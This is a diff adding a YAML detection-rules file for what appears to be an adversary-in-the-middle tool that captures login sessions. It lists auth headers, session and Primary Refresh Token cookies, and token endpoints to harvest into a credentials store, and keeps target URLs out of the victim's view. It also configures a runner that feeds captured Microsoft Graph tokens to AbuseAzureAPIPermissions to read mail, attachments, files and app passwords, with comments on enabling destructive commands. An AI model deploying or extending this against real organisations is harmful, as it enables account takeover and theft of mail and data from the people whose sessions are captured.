@@ -1,0 +1,741 @@
+# ============================================================================
+# sites.yaml — declarative detection rules consumed by backend/site_rules.py
+# ============================================================================
+#
+# This file ships the default recognition rules for common IdPs and post-login
+# destinations. Override or extend without code changes:
+#
+#   1. Edit this file in-place (commits travel with the repo).
+#   2. Drop a file at $DATA_DIR/sites.yaml — its top-level keys override/extend
+#      the ones here (deep-merged).
+#
+# The file is hot-reloaded: mtime is checked on each access, so saving picks
+# up within a second.
+#
+# Top-level sections:
+#   globals:    patterns that apply across all sites (MCAS, dead-end URLs, etc.)
+#   sites:      per-site entries (IdPs, post-login destinations)
+#   login_targets: short aliases → full URLs, used by the ?target= param on
+#                  :8091 sessions (keeps actual URLs out of client-visible UI)
+#
+# ============================================================================
+
+globals:
+  # CORS + generic headers that look auth-ish but aren't. Filtered from
+  # every per-header capture pass.
+  ignore_headers:
+    - access-control-allow-origin
+    - access-control-allow-methods
+    - access-control-allow-headers
+    - access-control-expose-headers
+    - access-control-allow-credentials
+    - access-control-max-age
+
+  # Explicit auth header names (lowercased, checked with exact match).
+  auth_headers:
+    - authorization
+    - cookie
+    - set-cookie
+    - x-csrf-token
+    - x-xsrf-token
+    - csrf-token
+    - x-ms-token
+    - x-session-token
+    - x-auth-token
+    - www-authenticate
+    - proxy-authenticate
+    - proxy-authorization
+
+  # Substring match across header names to catch anything session/token-like.
+  session_keywords:
+    - session
+    - token
+    - bearer
+    - saml
+    - oauth
+    - jwt
+    - csrf
+    - xsrf
+    - identity
+    - sid
+    - ssid
+    - refresh
+    - access-token
+
+  # Header names we always persist to the credentials store, even if the
+  # keyword match wouldn't have caught them.
+  capture_header_names:
+    - authsvctoken
+    - simplesamlsessionid
+  capture_header_keywords:
+    - csrf
+
+  # Regex patterns matched against `CONSOLE [type] message` lines
+  # produced by Playwright's `console` event. Matching lines are
+  # dropped before they hit the log buffer / WS fanout — keeps the
+  # operator-visible feed focused on auth-relevant signal instead of
+  # framework chatter. Compiled once per YAML hot-reload via
+  # site_rules.console_filter_re(). Add patterns for any new noisy
+  # SDK you encounter; commit upstream if it's broadly applicable.
+  console_filter_patterns:
+    # MSAL — both naming variants the SDK uses. Drop all Verbose AND
+    # Info lines; real failures still surface at Error / Warning.
+    # Hundreds of these per page-load on myapps.microsoft.com,
+    # signalling nothing actionable to the operator.
+    - "@azure/msal-(browser|react)@[\\d.]+ : (Verbose|Info) -"
+    - "msal\\.js\\.browser@[\\d.]+ : (Verbose|Info) -"
+    # MSAL React provider lifecycle (`MsalProvider - …`, `useAccount`,
+    # `useMsalAuthentication`) emitted at Info level — pure framework
+    # state-machine narration.
+    - "@azure/msal-react@[\\d.]+ : Info - (MsalProvider|useAccount|useMsalAuthentication)"
+    # Microsoft @iamexperiences feature-auth render-trace noise that
+    # rides MSAL's logger but isn't tagged with the standard prefix.
+    - "@iamexperiences/feature-auth, message: (rendering|AuthenticatedTemplate|UnauthenticatedTemplate|willStartLoginFlowExplicitly)"
+    # BrowserSSO telemetry blob that AAD ships on every auth page.
+    - 'BSSO Telemetry: '
+    - 'BrowserSSO Initialized'
+    # AAD / Edge fingerprint diagnostics that fire on every load.
+    - "Two extensions have same priority"
+    # Application Insights / 1DS telemetry SDK init noise.
+    - "1DS-Web-JS : "
+    - "AppInsightsCore: "
+    # CSP / mixed-content / favicon noise that fires on every navigation.
+    - "Refused to display .* in a frame because it set 'X-Frame-Options'"
+    - "Refused to load the (image|script|stylesheet) "
+    # Lone "true"/"false"/"null"/"undefined" console.log() calls — pure noise.
+    - "^CONSOLE \\[(log|info|debug)\\] (true|false|null|undefined)$"
+
+  # Hostnames whose request + response bodies the :3128 auth proxy
+  # records into the Flow Trace buffer (synthetic session
+  # `proxy_<hostname>`) so the Index tab, milestone classifier, and
+  # Decoded JWTs section work on them. By default :3128 only stores
+  # cookies + auth headers; this lets specific high-value endpoints
+  # (device registration, token endpoints behind unusual hosts) get
+  # full-body treatment without enabling it everywhere.
+  # Substring + "*.suffix" match. Bodies still capped at 64 KB by
+  # `MAX_FLOW_BODY` in routes/browser.py.
+  body_capture_hostnames:
+    # Microsoft Entra Device Registration Service (DRS).
+    - enterpriseregistration.windows.net
+    - device.login.microsoftonline.com
+    # Token endpoints that aren't on login.microsoftonline.com.
+    - sts.windows.net
+    # Microsoft Graph (post-auth API surface).
+    - graph.microsoft.com
+    # Microsoft Intune MDM — enrollment (SOAP) + check-in (SyncML/OMA-DM).
+    # Bodies on these endpoints are XML/SOAP, well under MAX_FLOW_BODY,
+    # and contain the device-posture / compliance signals we want to
+    # surface. Visibility-only at v0; not replayed by anything yet.
+    - enrollment.manage.microsoft.com
+    - manage.microsoft.com
+    - r.manage.microsoft.com
+    - "*.r.manage.microsoft.com"
+
+  # MCAS (Microsoft Cloud App Security) proxy domains. Post-login traffic
+  # often gets rewritten through these.
+  mcas_domains:
+    - mcas.ms
+    - access.mcas.ms
+    - cloud.microsoft
+
+  # MCAS CDN/i18n assets whose JSON body shouldn't be mined for auth headers.
+  mcas_noise_domains:
+    - inline.cdn.mcas.ms
+    - cdn.mcas.ms
+
+  # URLs that are dead-ends (404s, chrome errors, broken rewrites) — the
+  # browser auto-navigates back when it lands on one.
+  dead_end_url_patterns:
+    - "chrome-error://"
+    - "chrome://network-error"
+    - "m365.cloud.microsoft.mcas.ms"
+    - "m365.cloud.microsoft.mcas.ms/login"
+
+  # Conditional Access block detail extraction. When a session lands on
+  # one of `url_match_patterns` (matched as a lowercased substring),
+  # `_classify_challenge` pulls the listed query/fragment params out of
+  # the URL into a `details` dict that's appended to the CHALLENGE log
+  # line on :8092 and to the `challenge` WebSocket event. Param-name
+  # match is case-insensitive — list each canonical spelling once and
+  # both `Reason` and `reason` will land under it. Add new keys as you
+  # encounter them in the field; no Python edit needed.
+  ca_blocked:
+    url_match_patterns:
+      - "aka.ms/conditionalaccess"
+    param_keys:
+      # AAD correlation ids — cross-reference with sign-in logs.
+      - client-request-id
+      - correlationId
+      - requestId
+      # Policy + reason fields visible on AAD CA block redirects.
+      - Policy
+      - Reason
+      - cardType
+      - errorCode
+      # App + device + user identifiers.
+      - appName
+      - appId
+      - deviceId
+      - userPrincipalName
+
+  # Conditional Access milestones (flow-trace level). Consumed by
+  # `auth_milestones.classify(entry)` so CA signals get tagged on every
+  # captured flow row — not just top-level page navigations the way
+  # `_classify_challenge` does. Lets `/common/reprocess` (claim
+  # challenge that often runs in iframes / redirect chains) and
+  # AADSTS-coded responses surface as banner pills even when the
+  # browser never navigates to a user-facing block page.
+  ca_milestones:
+    # User-facing block redirects. Tagged kind=ca_blocked with the URL
+    # params from the `globals.ca_blocked.param_keys` list above.
+    blocked_url_patterns:
+      - "aka.ms/conditionalaccess"
+    # AAD claim-challenge endpoints. Tagged kind=ca_reprocess —
+    # commonly fires before AAD decides whether to issue a token or
+    # redirect the user to the block page.
+    reprocess_url_patterns:
+      - "/common/reprocess"
+    # AADSTS codes (substring match) that indicate a CA-related
+    # failure. Detected against the response body, the URL itself, and
+    # the Location header. The human meaning is pulled from the
+    # existing per-site `error_codes` map at scan time.
+    aadsts_codes:
+      - AADSTS53000  # device must be managed
+      - AADSTS53001  # device must be domain joined
+      - AADSTS53002  # ToS not accepted
+      - AADSTS53003  # access blocked by policy
+      - AADSTS50158  # external security challenge (CA)
+      - AADSTS50199  # re-authenticate for phishing-resistant MFA
+
+  # Microsoft Intune MDM milestones (visibility-only at v0). Tagged on
+  # flow rows by `auth_milestones.classify` whenever a captured request
+  # hits one of the listed Intune endpoints. The host filter (`hosts:`)
+  # narrows path-pattern matching to the Intune service domains so a
+  # random app's `/SyncML` path doesn't false-positive. Three phase
+  # kinds, mirroring the standard [MS-MDE2] / [MS-MDM] flow:
+  #
+  #   mdm_discover  — discovery: client asks "where do I enroll?"
+  #   mdm_enroll    — enrollment: device gets its MDM cert + policies
+  #   mdm_checkin   — periodic SyncML / OMA-DM session reporting
+  #                   posture; Intune evaluates and stores compliance
+  #                   verdict in AAD against the device id.
+  #
+  # Compliance verdict (`isCompliant: true/false`) lives server-side
+  # in Intune and propagates into AAD device records out-of-band. We
+  # do not attempt to extract it from the SyncML body at v0 — it's
+  # not reliably encoded there for client-side observers. Look at the
+  # next id_token's `deviceid` claim + an AAD device-state probe to
+  # see what AAD actually thinks.
+  mdm_milestones:
+    discover_url_patterns:
+      - "/EnrollmentServer/Discovery"
+      - "/devicemanagement/Discovery"
+    enroll_url_patterns:
+      - "/EnrollmentServer/Enrollment"
+      - "/EnrollmentServer/Policy"
+    checkin_url_patterns:
+      - "/dmserver"
+      - "/manage.svc"
+      - "/SyncML"
+      - "/devicemanagement/MdmEnrollment"
+    # Path matches only fire when the request URL host matches one of
+    # these (substring or `*.suffix`). Keeps Intune's well-known path
+    # shapes from accidentally tagging unrelated traffic.
+    hosts:
+      - manage.microsoft.com
+      - r.manage.microsoft.com
+      - enrollment.manage.microsoft.com
+
+  # Relying-party callback URL patterns. When `auth_milestones.classify`
+  # sees a 4xx/5xx response on a request whose URL matches one of these
+  # — *and* the host is not one of the `auth_milestones.idp_hosts` — it
+  # tags the row as kind=rp_reject. Captures the common shape where
+  # AAD vouched (issued an id_token / posted to the RP) but the RP
+  # decided the resulting principal didn't satisfy its own policy
+  # (e.g. CA claim missing, audience mismatch, license expired).
+  rp_callbacks:
+    url_patterns:
+      - "/signin-oidc"
+      - "/signin-saml"
+      - "/saml/acs"
+      - "/saml/consume"
+      - "/oauth/callback"
+      - "/oidc/callback"
+      - "/aad-redirect"
+      - "/.auth/login/aad/callback"
+
+  # Hosts whose requests we silently drop from the REQ/RESP log stream —
+  # telemetry beacons, analytics, CDN health pings. Accepts plain
+  # substrings or "*.suffix" wildcards. These don't carry auth state and
+  # just clutter the timeline.
+  noisy_hosts:
+    - "browser.events.data.microsoft.com"
+    - "eu-mobile.events.data.microsoft.com"
+    - "self.events.data.microsoft.com"
+    - "v10.events.data.microsoft.com"
+    - "*.events.data.microsoft.com"
+    - "www.google-analytics.com"
+    - "www.googletagmanager.com"
+    - "stats.g.doubleclick.net"
+    - "region1.google-analytics.com"
+    - "region1.analytics.google.com"
+    - "ad.doubleclick.net"
+    - "dc.services.visualstudio.com"
+    - "*.applicationinsights.azure.com"
+    - "*.clarity.ms"
+    - "www.clarity.ms"
+    - "*.nr-data.net"
+    - "bam.nr-data.net"
+    - "*.newrelic.com"
+    - "*.segment.io"
+    - "api.segment.io"
+    - "cdn.segment.com"
+    - "*.mixpanel.com"
+    - "api.mixpanel.com"
+    - "*.amplitude.com"
+    - "api.amplitude.com"
+    - "*.hotjar.com"
+    - "*.datadoghq.com"
+    - "*.browser-intake-datadoghq.com"
+    - "*.sentry.io"
+    - "o4.ingest.sentry.io"
+    - "*.fullstory.com"
+    - "*.fullstory.net"
+    - "*.pendo.io"
+    - "*.loggr.com"
+    - "logs.twilio.com"
+    - "metrics.akamaized.net"
+
+  # App-install / app-store redirects we want to dismiss.
+  app_install_url_patterns:
+    - "microsoft365.com/setup"
+    - "microsoft365.com/apps"
+    - "www.microsoft365.com/setup"
+    - "www.microsoft365.com/apps"
+    - "teams.microsoft.com/dl/launcher"
+    - "teams.microsoft.com/_#/apps"
+    - "go.microsoft.com/fwlink"
+    - "aka.ms/"
+    - "play.google.com/store"
+    - "apps.apple.com/"
+    - "microsoft365.com/launch"
+
+# ============================================================================
+# Per-site rules. Each entry describes an IdP or post-login destination.
+# Match is on hostname (substring + "*.suffix" wildcard). Rules for all
+# matching sites are merged.
+# ============================================================================
+
+sites:
+  - name: microsoft
+    hosts:
+      - login.microsoftonline.com
+      - login.live.com
+      - login.microsoft.com
+      - graph.microsoft.com
+    # URLs that mean "still logging in" — never treated as auth-complete.
+    login_url_patterns:
+      - "login.microsoftonline.com"
+      - "login.live.com"
+      - "login.microsoft.com"
+      - "accounts.google.com/signin"
+      - "accounts.google.com/o/oauth2"
+      - "/oauth2/v2.0/authorize"
+      - "/oauth2/authorize"
+    # Challenge classifier rules. Matches are tried in order; first hit wins.
+    challenges:
+      # URL substring → challenge kind
+      url_rules:
+        - match: "/common/sas/beginauth"
+          kind: mfa_begin
+        - match: "/common/sas/processauth"
+          kind: mfa_begin
+        - match: "/common/sas/endauth"
+          kind: mfa_verify
+        - match: "/kmsi"
+          kind: kmsi
+        - match: "/appverify"
+          kind: consent
+        - match: "/common/reprocess"
+          kind: ca_reprocess
+        - match: "/deviceauth"
+          kind: device_auth
+        - match: "changepassword.aspx"
+          kind: password_change
+        - match: "aka.ms/conditionalaccess"
+          kind: ca_blocked
+      # Regex URL rules (run after plain `url_rules`)
+      url_regex:
+        - match_re: '.*/oauth2/v2\.0/authorize.*prompt=consent'
+          kind: consent
+      # DOM selector rules — only consulted when page host matches this site.
+      dom_rules:
+        - selector: 'input[name="loginfmt"]'
+          kind: username
+        - selector: 'input[name="passwd"]'
+          kind: password
+        - selector: 'input[name="otc"]'
+          kind: mfa_code
+        - selector: '[data-value="Fido"], [data-value="FidoKey"], [data-value="WindowsHelloForBusiness"]'
+          kind: passkey
+        - selector: '#idRichContext_DisplaySign'
+          kind: mfa_app_number_match
+      # Response-body error extraction for Microsoft OIDC error responses.
+      response_errors:
+        - url_match: "/oauth2/"
+          code_path: "error"
+          message_path: "error_description"
+        - url_match: "/common/"
+          code_path: "ErrorCode"
+          message_path: "Message"
+      # Regex for authoritative error codes in URL fragment / body
+      error_regex: 'AADSTS\d{4,6}'
+      # Error-code → human explanation
+      error_codes:
+        AADSTS50055:  "password expired"
+        AADSTS50076:  "MFA required but not enrolled"
+        AADSTS50079:  "MFA enrollment required"
+        AADSTS50105:  "user not assigned to this app"
+        AADSTS50126:  "invalid username or password"
+        AADSTS50158:  "external security challenge (CA)"
+        AADSTS50199:  "re-authenticate for phishing-resistant MFA"
+        AADSTS53000:  "CA — device must be managed"
+        AADSTS53001:  "CA — device must be domain joined"
+        AADSTS53002:  "CA — user must accept ToS"
+        AADSTS53003:  "CA — access blocked by policy"
+        AADSTS65001:  "consent required"
+        AADSTS700016: "application not found (bad client_id)"
+        AADSTS50058:  "no signed-in user"
+
+  - name: cyberark
+    hosts:
+      - "*.cyberark.cloud"
+    login_url_patterns:
+      - ".cyberark.cloud/login"
+    challenges:
+      url_rules:
+        - match: "/security/resumefromextidpauth"
+          kind: idp_return
+        - match: "/mfa/"
+          kind: mfa_verify
+      dom_rules:
+        - selector: '#MfaForm'
+          kind: mfa_method
+        - selector: 'input[name="Username"]'
+          kind: username
+        - selector: 'input[name="Password"]'
+          kind: password
+      # Scan response JSON bodies of these endpoints for structured errors.
+      # Matches when `url_match` substring is in the request URL and the
+      # response body is JSON containing `code_path`. Emits a CHALLENGE
+      # with kind=error + aadsts=<code> + meaning=<message>.
+      response_errors:
+        - url_match: "/security/resumefromextidpauth"
+          code_path: "Result.ErrorCode"
+          message_path: "Result.Message"
+        - url_match: "/security/"
+          code_path: "ErrorCode"
+          message_path: "Message"
+        - url_match: "/mfa/"
+          code_path: "Result.ErrorCode"
+          message_path: "Result.Message"
+      # Short human-readable hints for CyberArk codes. Extend as you see new ones.
+      error_codes:
+        IDAPP_00003: "user not found in CyberArk tenant"
+        IDAPP_00008: "pending auth expired / cookie lost between redirects"
+        IDAPP_00001: "invalid credentials"
+        PCloudVersion: "tenant version mismatch"
+
+  - name: google
+    hosts:
+      - accounts.google.com
+    login_url_patterns:
+      - "accounts.google.com/signin"
+      - "accounts.google.com/o/oauth2"
+    challenges:
+      url_rules:
+        - match: "/signin/identifier"
+          kind: username
+        - match: "/signin/challenge/pwd"
+          kind: password
+        - match: "/signin/challenge/totp"
+          kind: mfa_code
+        - match: "/signin/challenge/skotp"
+          kind: passkey
+      dom_rules:
+        - selector: 'input[type="email"]#identifierId'
+          kind: username
+        - selector: 'input[type="password"][name="Passwd"]'
+          kind: password
+      response_errors:
+        - url_match: "/o/oauth2/"
+          code_path: "error"
+          message_path: "error_description"
+      error_codes:
+        invalid_client:  "client not recognised (bad client_id / redirect_uri)"
+        invalid_grant:   "code expired or already used, or redirect_uri mismatch"
+        access_denied:   "user denied consent"
+        unauthorized_client: "client not authorized for this grant_type"
+        invalid_scope:   "scope not permitted by the client"
+
+  - name: okta
+    hosts:
+      - "*.okta.com"
+      - "*.oktapreview.com"
+    login_url_patterns:
+      - ".okta.com/login"
+      - ".okta.com/signin"
+    challenges:
+      url_rules:
+        - match: "/app/"
+          kind: app_launch
+      dom_rules:
+        - selector: 'input[name="username"]'
+          kind: username
+        - selector: 'input[name="password"]'
+          kind: password
+        - selector: 'input[name="answer"]'
+          kind: mfa_code
+      response_errors:
+        - url_match: "/api/v1/authn"
+          code_path: "errorCode"
+          message_path: "errorSummary"
+        - url_match: "/api/v1/"
+          code_path: "errorCode"
+          message_path: "errorSummary"
+      error_codes:
+        E0000004: "authentication failed (bad credentials)"
+        E0000011: "invalid token provided"
+        E0000015: "access to this app is denied"
+        E0000068: "invalid passcode / answer"
+        E0000069: "account locked"
+        E0000079: "this operation requires MFA"
+
+  # ── Post-login destinations (auth_complete_url_patterns are the trigger
+  # for auto-capture). Add your SaaS landing pages here.
+  - name: microsoft_mcas_complete
+    hosts:
+      - access.mcas.ms
+      - mcas.ms
+      - portal.office.com
+    auth_complete_url_patterns:
+      - "access.mcas.ms/aad_login"
+      - "access.mcas.ms/finalize_login"
+      - "mcas.ms/?from="
+      - "portal.office.com/?"
+
+# ============================================================================
+# Login-URL aliases used by the ?target= query param on :8091. Keeps the
+# actual URL out of client-visible artifacts.
+# ============================================================================
+login_targets:
+  default: https://myapps.microsoft.com
+  mail:    https://outlook.office365.com
+  portal:  https://www.office.com
+  forms:   https://forms.office.com
+  teams:   https://teams.microsoft.com
+
+# ============================================================================
+# aaa_runner — controls the dashboard's "AAA" button (Captured Credentials →
+# per-site card). The button POSTs to /api/aaa/run, which shells out to
+# pwsh, dot-sources tools/AbuseAzureAPIPermissions/AbuseAzureAPIPermissions.ps1,
+# sets $Script:AAAtoken to a captured Graph access_token, and runs the
+# selected function.
+#
+# Functions outside `allowed_functions` are rejected by the backend. The
+# defaults are recon-only (Get-* / Find-*). To enable destructive ops
+# (Set-/New-/Remove-/Send-) copy this block into $DATA_DIR/sites.yaml and
+# add the verbs you want — _deep_merge REPLACES this list, so include the
+# recon entries you still want.
+# ============================================================================
+aaa_runner:
+  script_path: tools/AbuseAzureAPIPermissions/AbuseAzureAPIPermissions.ps1
+  pwsh: pwsh
+  timeout_seconds: 60
+  allowed_functions:
+    - Get-AAADataFromGraphToken
+    - Get-AAAUser
+    - Get-AAAUserDevices
+    - Get-AAAUserMemberOf
+    - Get-AAAUserAuthMethod
+    - Get-AAAUserAgent
+    - Get-AAAGroups
+    - Get-AAAGroupMembers
+    - Get-AAAApplication
+    - Get-AAAApplicationOwner
+    - Get-AAAAppRoleAssignments
+    - Get-AAAAppPassword
+    - Get-AAADirectoryRoleMember
+    - Get-AAASites
+    - Get-AAAOneDriveFolder
+    - Get-AAAOneDriveFile
+    - Get-AAAOneNotes
+    - Get-AAAOneNotesContent
+    - Get-AAAEmails
+    - Get-AAAEmailAttachments
+    - Get-AAAEmailRules
+    - Get-AAAAutenMethod
+    - Get-AAAUserAuthCert
+    - Get-AAATotalCount
+    - Find-AAAInterestingAppRoleAssignment
+    - Find-AAAInterestingDirectoryRoleAssignment
+
+# ============================================================================
+# auth_milestones — declarative classifier consumed by
+# backend/auth_milestones.py. Tags Flow Trace rows with banner pills for the
+# key OAuth/OIDC steps (LOGIN → AUTH CODE → TOKENS → SESSION → PRT).
+#
+# All sub-keys are optional; missing keys fall back to the package defaults.
+# Override file ($DATA_DIR/sites.yaml) deep-merges over these, but lists are
+# REPLACED (per backend/site_rules._deep_merge), so to extend a list copy
+# the defaults and add to them.
+# ============================================================================
+auth_milestones:
+  # Hostnames where IdP login pages live. Matched as exact host or
+  # ".suffix" of host. Used for the LOGIN tag and as a sanity guard
+  # for AUTH CODE detection.
+  idp_hosts:
+    - login.microsoftonline.com
+    - login.microsoft.com
+    - login.windows.net
+    - login.live.com
+    - login.microsoftonline.us
+    - login.partner.microsoftonline.cn
+    - accounts.google.com
+    - oauth2.googleapis.com
+    - appleid.apple.com
+    - github.com
+    - github.githubapp.com
+    - auth0.com
+    - okta.com
+    - okta-emea.com
+    - oktapreview.com
+    - onelogin.com
+    - pingidentity.com
+    - pingone.com
+    - duosecurity.com
+
+  # Path regexes that mark a login UI step on an idp_hosts URL.
+  # Anchored fragments like `(?:^|/)…(?:/|\?|$)` work well here.
+  # Compiled with re.IGNORECASE.
+  login_path_patterns:
+    - "(?:^|/)GetCredentialType(?:/|\\?|$)"
+    - "(?:^|/)kmsi(?:/|\\?|$)"
+    - "(?:^|/)consent(?:/|\\?|$)"
+    - "(?:^|/)SAS/(?:Begin|ProcessAuth|Cancel)(?:/|\\?|$)"
+    - "(?:^|/)reprocess(?:/|\\?|$)"
+    - "(?:^|/)oauth2/(?:v2\\.0/)?authorize(?:/|\\?|$)"
+    - "(?:^|/)oauth2/authresp(?:/|\\?|$)"
+    - "(?:^|/)login(?:/[^/]*)?(?:/|\\?|$)"
+    - "(?:^|/)signin(?:/[^/]*)?(?:/|\\?|$)"
+    - "(?:^|/)(?:interact|enroll|mfa|verify|push|prompt)(?:/|\\?|$)"
+    - "(?:^|/)u/(?:login|mfa|passwordless)(?:/|\\?|$)"
+
+  # Path regexes that DECISIVELY are not login pages even on IdP hosts —
+  # exempts them from the LOGIN tag (they get TOKENS / REFRESH / PRT
+  # instead). Important: keep these tight; matching here suppresses
+  # the LOGIN classifier entirely for the row.
+  not_login_path_patterns:
+    - "(?:^|/)oauth2?/(?:v2\\.0/)?(?:token|userinfo|devicecode|introspect|revoke)(?:/|\\?|$)"
+    - "(?:^|/)connect/(?:token|userinfo|introspect|revoke)(?:/|\\?|$)"
+    - "(?:^|/)\\.well-known/"
+    - "(?:^|/)(?:jwks|keys)(?:/|\\?|$)"
+
+  # Substrings that — when present in a request or response body — are
+  # strong evidence of a login-flow step (used as a fallback when the
+  # path itself isn't recognised, e.g. on a custom IdP).
+  login_body_markers:
+    - flowtoken
+    - flowToken
+    - '"flowToken"'
+    - canary=
+    - '"canary"'
+    - originalrequest=
+    - '"originalRequest"'
+    - "ctx="
+    - '"ctx"'
+    - stateToken
+    - stateHandle
+
+  # Path regexes that identify an OAuth/OIDC token endpoint. Used to
+  # gate TOKENS / REFRESH / PRT classification.
+  token_path_patterns:
+    - "(?:^|/)oauth2?/(?:v2\\.0/)?token(?:/|\\?|$)"
+    - "(?:^|/)oauth/token(?:/|\\?|$)"
+    - "(?:^|/)connect/token(?:/|\\?|$)"
+    - "(?:^|/)as/token\\.oauth2(?:/|\\?|$)"
+    - "(?:^|/)token\\.oauth2(?:/|\\?|$)"
+    - "(?:^|/)token/?$"
+
+  # Cookie names whose Set-Cookie qualifies as the SESSION milestone.
+  # Matched lowercased against the cookie name. PRT-marker cookies
+  # (currently the x-ms-* family) are detected separately by prefix.
+  session_cookie_names:
+    - estsauth
+    - estsauthpersistent
+    - estsauthlight
+    - fpc
+    - buid
+    - esctx
+    - signinstatecookie
+    - mspauth
+    - mspprof
+    - mspok
+    - rpsauth
+    - x-ms-prt
+    - x-ms-refreshtokencredential
+    - x-ms-cpim-trans
+    - x-ms-cpim-csrf
+    - x-ms-cpim-sso
+    - sid
+    - hsid
+    - ssid
+    - apisid
+    - sapisid
+    - __secure-3psid
+    - __secure-3psidcc
+    - __secure-3psidts
+    - lsid
+    - __secure-osid
+    - auth0
+    - auth0_compat
+    - did
+    - did_compat
+    - idsrvauth
+    - okta-oauth-state
+    - okta-oauth-nonce
+    - pf
+    - pa.local
+
+  # Cookie-name lowercased prefixes that also count as SESSION cookies.
+  # Useful when a SaaS picks app-specific names (e.g. "appsession-").
+  session_cookie_prefixes:
+    - estsauth
+    - x-ms-
+    - auth0
+    - okta-
+    - appsession
+    - session
+    - sess_
+
+  # Cookie-name lowercased prefixes that mark a Primary Refresh Token
+  # cookie specifically. Triggers the PRT tag (in addition to SESSION
+  # for other cookies set in the same response).
+  prt_cookie_prefixes:
+    - x-ms-
+
+  # POST-body grant_type values that promote TOKENS to PRT. AAD's
+  # device-bound flows use these.
+  prt_grant_types:
+    - srv_challenge
+    - "urn:ietf:params:oauth:grant-type:jwt-bearer"
+
+  # Scope tokens (whitespace-separated) that imply PRT issuance.
+  prt_scopes:
+    - aza
+    - openid_aza
+
+  # Response token_type values that imply PRT.
+  prt_token_types:
+    - pop
+    - bearer-prt
